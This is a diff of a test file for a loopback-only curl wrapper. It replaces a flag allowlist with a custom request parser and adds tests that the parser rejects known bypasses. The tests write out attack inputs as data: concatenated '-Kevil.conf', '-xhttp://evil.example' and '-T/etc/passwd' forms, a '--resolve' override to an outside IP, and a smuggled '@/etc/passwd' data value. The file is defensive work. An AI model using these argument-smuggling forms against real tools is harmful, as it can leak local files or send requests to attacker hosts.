@@ -4,23 +4,23 @@
 // IPv4-mapped form — unlike `_fetch-asset.mjs`'s `classifyAddress`, an
 // ordinary private-LAN address like 192.168.1.1 is REJECTED here, not
 // allowed), the every-record DNS check (closes the multi-A-record rebinding
-// gap), the argv URL scan (curl accepts its target in any position, and more
-// than one), and — added by the security addendum — the argv ALLOWLIST that
-// rejects `-K`/`--resolve`/`--connect-to`/`-L`/`--proxy` and friends outright
-// (a live security fan-out found the first cut's blocklist-free forwarding
-// let those flags smuggle an unvalidated second target past the loopback
-// check entirely; see the file's own header comment for the two confirmed
-// exploits).
+// gap), and — round 2 of the security addendum — the Maude-owned request
+// parser (`parseRequestArgv`) that REPLACED the raw-curl-argv allowlist a
+// live security fan-out found still bypassable via curl's own concatenated
+// short-flag syntax (`-K<path>`, `-x<url>`, `-T<path>` all slipped past the
+// `a.split('=')[0]` check) and a missing `--noproxy` reject entry. This file
+// no longer recognizes ANY curl flag at all — only its own small vocabulary
+// — so there is no curl-syntax bypass class left to enumerate against.
 
 import { describe, expect, test } from 'bun:test';
 import {
+  buildCurlArgs,
+  CurlLocalArgvError,
   CurlLocalError,
   classifyRecords,
-  findTargetUrls,
   isLoopbackAddress,
-  REJECTED_FLAGS,
+  parseRequestArgv,
   resolveLoopbackIp,
-  validateArgv,
 } from './_curl-local.mjs';
 
 describe('isLoopbackAddress', () => {
@@ -120,64 +120,161 @@ describe('resolveLoopbackIp', () => {
   });
 });
 
-describe('validateArgv — the allowlist that closes the -K/--resolve/--connect-to bypasses', () => {
-  test('accepts an ordinary loopback invocation', () => {
-    expect(validateArgv(['-s', '-X', 'GET', 'http://localhost:3000/api'])).toBeNull();
+describe('parseRequestArgv — the Maude-owned flag vocabulary (never raw curl syntax)', () => {
+  test('a bare URL parses as a GET with no headers/body', () => {
+    const req = parseRequestArgv(['http://localhost:3000/api']);
+    expect(req.url).toBe('http://localhost:3000/api');
+    expect(req.method).toBe('GET');
+    expect(req.headers).toEqual([]);
+    expect(req.data).toBeNull();
   });
 
-  for (const flag of REJECTED_FLAGS) {
-    test(`rejects ${flag} anywhere in argv`, () => {
-      const reason = validateArgv(['http://127.0.0.1:1/', flag, 'x']);
-      expect(reason).toContain(flag);
-    });
-  }
-
-  test('rejects the config-file-injection PoC verbatim (security-auditor finding 1)', () => {
-    const reason = validateArgv(['http://127.0.0.1:1/decoy', '-K', 'evil.conf']);
-    expect(reason).not.toBeNull();
+  test('--method, repeated --header, and --data all parse', () => {
+    const req = parseRequestArgv([
+      'http://localhost:3000/api',
+      '--method',
+      'post',
+      '--header',
+      'Content-Type: application/json',
+      '--header',
+      'X-Test: 1',
+      '--data',
+      '{"a":1}',
+    ]);
+    expect(req.method).toBe('POST'); // uppercased
+    expect(req.headers).toEqual(['Content-Type: application/json', 'X-Test: 1']);
+    expect(req.data).toBe('{"a":1}');
   });
 
-  test('rejects the --resolve target-override PoC verbatim (ethical-hacker finding B)', () => {
-    const reason = validateArgv(['--resolve', 'localhost:80:203.0.113.5', 'http://localhost/']);
-    expect(reason).not.toBeNull();
+  test('boolean flags (--insecure/--include/--verbose) parse with no value consumed', () => {
+    const req = parseRequestArgv([
+      'http://localhost:3000/',
+      '--insecure',
+      '--include',
+      '--verbose',
+    ]);
+    expect(req.insecure).toBe(true);
+    expect(req.include).toBe(true);
+    expect(req.verbose).toBe(true);
   });
 
-  test('rejects a `--flag=value` form of a rejected flag, not just the bare form', () => {
-    expect(
-      validateArgv(['http://127.0.0.1:1/', '--proxy=http://evil.example:8080'])
-    ).not.toBeNull();
+  test('rejects an unrecognized method', () => {
+    expect(() => parseRequestArgv(['http://localhost:3000/', '--method', 'TRACE'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects a malformed header (must look like "Name: value")', () => {
+    expect(() => parseRequestArgv(['http://localhost:3000/', '--header', 'not-a-header'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects a non-positive --max-time', () => {
+    expect(() => parseRequestArgv(['http://localhost:3000/', '--max-time', '0'])).toThrow(
+      CurlLocalArgvError
+    );
+    expect(() => parseRequestArgv(['http://localhost:3000/', '--max-time', 'nope'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects a non-http(s) URL scheme', () => {
+    expect(() => parseRequestArgv(['file:///etc/passwd'])).toThrow(CurlLocalArgvError);
+  });
+
+  test('rejects a value-taking flag with no value', () => {
+    expect(() => parseRequestArgv(['http://localhost:3000/', '--header'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects more than one positional argument', () => {
+    expect(() => parseRequestArgv(['http://localhost:3000/', 'http://localhost:4000/'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects when no URL is given at all', () => {
+    expect(() => parseRequestArgv(['--method', 'GET'])).toThrow(CurlLocalArgvError);
+  });
+
+  // ── Round-2 security addendum: these are exactly the argv forms that
+  // bypassed the PREVIOUS raw-curl-argv allowlist. None of them are
+  // "rejected flags" here — they're simply not part of this file's flag
+  // vocabulary at all, so they fall through to the generic
+  // "unrecognized flag" / "unexpected extra argument" path.
+  test('rejects the concatenated -K<path> config-file-smuggling PoC verbatim (round-2 finding #1)', () => {
+    expect(() => parseRequestArgv(['http://127.0.0.1:1/', '-Kevil.conf'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects a caller-supplied --noproxy override verbatim (round-2 finding #2)', () => {
+    expect(() => parseRequestArgv(['http://127.0.0.1:1/', '--noproxy', ''])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects the concatenated -x<url>/-T<path> short forms (round-2 finding #3)', () => {
+    expect(() => parseRequestArgv(['-xhttp://evil.example', 'http://127.0.0.1:1/'])).toThrow(
+      CurlLocalArgvError
+    );
+    expect(() => parseRequestArgv(['http://127.0.0.1:1/', '-T/etc/passwd'])).toThrow(
+      CurlLocalArgvError
+    );
+  });
+
+  test('rejects the original --resolve/--connect-to target-override PoC verbatim', () => {
+    expect(() =>
+      parseRequestArgv(['--resolve', 'localhost:80:203.0.113.5', 'http://localhost/'])
+    ).toThrow(CurlLocalArgvError);
+  });
+
+  test('a value containing curl-flag-shaped text is inert data, not a flag — no injection via --data', () => {
+    // "@/etc/passwd" as a --data value must never be treated as curl's
+    // "read a file" shorthand (that's -d/--data's behavior, not
+    // --data-raw's, which buildCurlArgs always uses — see the live
+    // end-to-end test below for the full round-trip proof).
+    const req = parseRequestArgv([
+      'http://localhost:3000/',
+      '--data',
+      '@/etc/passwd; -K evil.conf',
+    ]);
+    expect(req.data).toBe('@/etc/passwd; -K evil.conf');
   });
 });
 
-describe('findTargetUrls — curl accepts its target URL in any argv position, and more than one', () => {
-  test('finds a single URL among flags', () => {
-    const urls = findTargetUrls(['-s', '-X', 'GET', 'http://localhost:3000/api']);
-    expect(urls).toHaveLength(1);
-    expect(urls[0].hostname).toBe('localhost');
+describe("buildCurlArgs — every flag name is one of THIS file's own hardcoded literals", () => {
+  test('a bare GET pins the connection and forces the safety flags', () => {
+    const req = parseRequestArgv(['http://localhost:3000/']);
+    const args = buildCurlArgs(req, '127.0.0.1', 3000);
+    expect(args).toContain('--resolve');
+    expect(args[args.indexOf('--resolve') + 1]).toBe('localhost:3000:127.0.0.1');
+    expect(args).toContain('--noproxy');
+    expect(args).toContain('-q'); // curlrc disabled
+    expect(args).toEqual(expect.arrayContaining(['--max-redirs', '0']));
+    expect(args.at(-1)).toBe('http://localhost:3000/'); // the URL, always last, after `--`
+    expect(args.at(-2)).toBe('--');
   });
 
-  test('finds the URL when flags come AFTER it too', () => {
-    const urls = findTargetUrls(['http://localhost:3000/api', '-s']);
-    expect(urls).toHaveLength(1);
-  });
-
-  test('finds multiple targets (curl supports more than one URL)', () => {
-    const urls = findTargetUrls(['http://localhost:1/a', 'http://localhost:2/b']);
-    expect(urls.map((u) => u.href)).toEqual(['http://localhost:1/a', 'http://localhost:2/b']);
-  });
-
-  test('a flag value that is not a URL (e.g. a JSON payload) is not mistaken for a target', () => {
-    const urls = findTargetUrls(['-d', '{"a":1}', 'http://localhost:3000']);
-    expect(urls).toHaveLength(1);
-    expect(urls[0].hostname).toBe('localhost');
-  });
-
-  test('a non-http(s) scheme (file://) is not recognized as a target', () => {
-    const urls = findTargetUrls(['file:///etc/passwd']);
-    expect(urls).toHaveLength(0);
-  });
-
-  test('no URL anywhere in argv returns an empty list', () => {
-    expect(findTargetUrls(['--version'])).toHaveLength(0);
+  test('POST + headers + data map to -X/-H/--data-raw (never -d, which treats a leading @ as a file path)', () => {
+    const req = parseRequestArgv([
+      'http://localhost:3000/api',
+      '--method',
+      'POST',
+      '--header',
+      'Content-Type: application/json',
+      '--data',
+      '@/etc/passwd',
+    ]);
+    const args = buildCurlArgs(req, '127.0.0.1', 3000);
+    expect(args).toContain('-X');
+    expect(args[args.indexOf('-X') + 1]).toBe('POST');
+    expect(args).toContain('-H');
+    expect(args[args.indexOf('-H') + 1]).toBe('Content-Type: application/json');
+    expect(args).toContain('--data-raw');
+    expect(args).not.toContain('-d');
+    expect(args[args.indexOf('--data-raw') + 1]).toBe('@/etc/passwd');
   });
 });
